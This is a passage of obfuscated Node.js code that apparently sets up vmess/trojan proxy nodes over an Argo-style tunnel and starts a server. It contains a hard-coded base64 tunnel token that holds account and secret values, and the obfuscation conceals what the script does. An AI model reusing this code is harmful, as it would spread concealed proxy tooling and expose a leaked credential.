essage','existsSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/dev/null','ARGO_DOMAIN','eyJhIjoiOTIxMTBhMjNlZTI4NjI2ZTZlNTc4NGE3MWQ1MTk3NDIiLCJ0IjoiMDRiZmM1ZmUtYjJmNi00Y2ZiLTg0Y2EtMWYxMjQ5ZjMxYWYxIiwicyI6Ik56a3lPR0l5WXpRdFlXVXlNUzAwTURNMkxUaGlZbVl0TldSaU1EUmlObVExTnpJMyJ9','from','PORT','\x0a\x20\x20tunnel:\x20','platform','\x0a\x0atrojan://','axios','boot.log','cdns.doon.eu.org','Unknown','1dSHxhQ','automatic\x20access\x20task\x20added\x20successfully','/vmess-argo','\x20-c\x20'];_0x2c4f=function(){return _0x58a0c9;};return _0x2c4f();}startserver()[_0x3cc298(0x203)](_0x3e16dc=>{const _0x2e1a3b=_0x3cc298;console[_0x2e1a3b(0x1e3)](_0x2e1a3b(0x1de),_0x3e16dc);}),app['listen'](PORT,()=>console[_0x3cc298(0x18a)](_0x3cc298(0x1b3)+PORT+'!'));
